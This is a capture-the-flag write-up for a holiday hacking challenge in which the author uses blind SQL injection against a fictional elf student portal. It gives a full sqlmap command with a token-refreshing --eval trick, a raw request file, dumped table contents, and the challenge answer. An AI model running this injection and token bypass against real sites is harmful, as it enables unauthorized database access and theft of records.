---
layout: objective
title: "Retrieve Scraps of Paper from Server"
#date: 2018-12-03
number: "9"
#image: "challenge.md"
question: "Get the scraps of paper from the student portal"
answer: "super sled-o-matic"
elf: "pepper"
images: ["1.png"]
narrative: ""
tags: [sample post, readability, test]
comments: false
image-dir: /assets/img/objectives/9
links: ["https://studentportal.elfu.org/"]
comments: false
---
<figure>
	<img src="/assets/img/objectives/9/question.jpg">
	<figcaption>Question</figcaption>
</figure>


Pepper is saying to use SQL Injection
<figure>
	<img src="/assets/img/elves/pepper/riddle.jpg">
	<figcaption>Question</figcaption>
</figure>

SQLi for blind sql injection and SQLMap and custom  tamper scripts.

From slack hints, the paper appears to be encrypted.

Probably will leverage this talk https://www.youtube.com/watch?v=obJdpKDpFBA

NOTES about the student server:

PHP server
There is a Desired Course of Study.  You can submit a request for an application, and then test the results of the application

On the Application page, I tried to insert bad code

Error: 
INSERT INTO applications (name, elfmail, program, phone, whyme, essay, status) VALUES ('SHAUN', 'test@test.com', 'select title, text from news where id=10 or 1=1', '4437584455', 'select title, text from news where id=10 or 1=1', 'select title, text from news where id=10 or 1=1', 'pending')
Duplicate entry 'test@test.com' for key 'elfmail'

elfmail looks to be the culprit.  


<figure>
	<img src="/assets/img/objectives/9/1.jpg">
	<figcaption>Data Returned</figcaption>
</figure>

When submitting a check for the application, this is the URL
```
https://studentportal.elfu.org/application-check.php?elfmail=test%40test.com&token=MTAwOTkyMjU5NTg0MTU3ODAwNDA1NjEwMDk5MjI1OS41ODQ%3D_MTI5MjcwMDkyMjY3NTIzMjMxNzUyMzA2LjY4OA%3D%3D
```

The "check.php" page has the form to submit to check.
This is the javascript
<figure>
	<img src="/assets/img/objectives/9/2.jpg">
	<figcaption>Scripts</figcaption>
</figure>


A call to "validator.php" with the token value
That returned a token: ```MTAwOTkyMzI5NjY0MTU3ODAwNTE1MTEwMDk5MjMyOS42NjQ=_MTI5MjcwMTgxOTY5OTIzMjMxNzU0NTQ5LjI0OA==```

The encoded value is submitted to application check

```
/application-check.php?elfmail=test%40test.com&token=MTAwOTkyMzI5NjY0MTU3ODAwNTE1MTEwMDk5MjMyOS42NjQ%3D_MTI5MjcwMTgxOTY5OTIzMjMxNzU0NTQ5LjI0OA%3D%3D
```

The token appears to change relative to the submitted email address.

Initial testing wtih sqlmap showed that I could not use the SqlMap CSRF capabilities.  However, SqlMap will allow
an --eval switch that will get the token from validator.php and overwrite that 

In order to submit, I will have to quickly grab a token and overwrite the "token" url.

```bash
python3 sqlmap.py -l send.txt \
	-p 'elfmail' \
	--proxy='https://localhost:8080' \
	--level=5 \
	--risk=2 \
	--eval="import urllib.request;import urllib.parse;page = urllib.request.urlopen('https://studentportal.elfu.org/validator.php');token = (page.read()).decode('utf-8');" \
	--sql-shell
```

With send.txt file containing a copy of the HTTP header information
```
GET /application-check.php?elfmail=test%40test.com&token=DEADB HTTP/1.1
Host: studentportal.elfu.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://studentportal.elfu.org/check.php
Connection: close
Upgrade-Insecure-Requests: 1

```

The  --dump is showing three tables: applications, krampus, and students

applications is taking forever, and contains a all the application submitted so far, so trying krumpus

Ran the above command with the --sql-shell so I can do recon

<figure>
	<img src="/assets/img/objectives/9/3.jpg">
	<figcaption>SQL Shell</figcaption>
</figure>

Looking for all values of the Krampus table, I see referencds to 6 images

<figure>
	<img src="/assets/img/objectives/9/4.jpg">
	<figcaption>Images</figcaption>
</figure>

<figure>
	<img src="/assets/img/objectives/9/img1.png">
	<figcaption>Images 1</figcaption>
</figure>

<figure>
	<img src="/assets/img/objectives/9/img2.png">
	<figcaption>Images 2</figcaption>
</figure>
<figure>
	<img src="/assets/img/objectives/9/img3.png">
	<figcaption>Images 3</figcaption>
</figure>
<figure>
	<img src="/assets/img/objectives/9/img4.png">
	<figcaption>Images 4</figcaption>
</figure>
<figure>
	<img src="/assets/img/objectives/9/img5.png">
	<figcaption>Images 5</figcaption>
</figure>
<figure>
	<img src="/assets/img/objectives/9/img6.png">
	<figcaption>Images 6</figcaption>
</figure>

I also extracted the Students table just in case

```
select * from students [9]:
[*] My goal is to be a happy elf!, Raindeer Husbandry, 1, Elfie, 392363902026
[*] I'm just a elf. Yes, I'm only a elf. And I'm sitting here on Santa's sleigh, it's a long, long journey To the christmas tree. It's a long, long wait while I'm tinkering in the factory. But I know I'll be making kids smile on the holiday... At least I hope and pray that I will But today. I'm still ju, Dreamineering, 2, Elferson, 39210852026
[*] Have you seen my list??? It is pretty high tech!, Geospatial Intelligence, 3, Alabaster Snowball, 392363902026
[*] I am an engineer and the inventor of Santa's magic toy-making machine., Composites and Engineering, 4, Bushy Evergreen, 392363902026
[*] My goal is to be a happy elf!, Toy Design, 5, Wunorse Openslae, 39236372526
[*] My goal is to be a happy elf!, Present Wrapping, 6, Bushy Evergreen, 392363128026
[*] Check out my makeshift armour made of kitchen pots and pans!!!, Reindeer Husbandry, 7, Pepper Minstix, 392363902026
[*] My goal is to be a happy elf!, Present Wrapping, 8, Sugarplum Mary, 5682168522137
[*] Santa and I are besties for life!!!, Holiday Cheer, 9, Shinny Upatree, 228755779218
```

The Krampus images put together are a message from someone claiming to sabatoge the Super Sled-o-matic

<figure>
	<img src="/assets/img/objectives/9/fullimage.png">
	<figcaption>Full Image</figcaption>
</figure>

There is still one scrap missing, that will tell who did this.  but, judging from the stationairy, its Hermy.

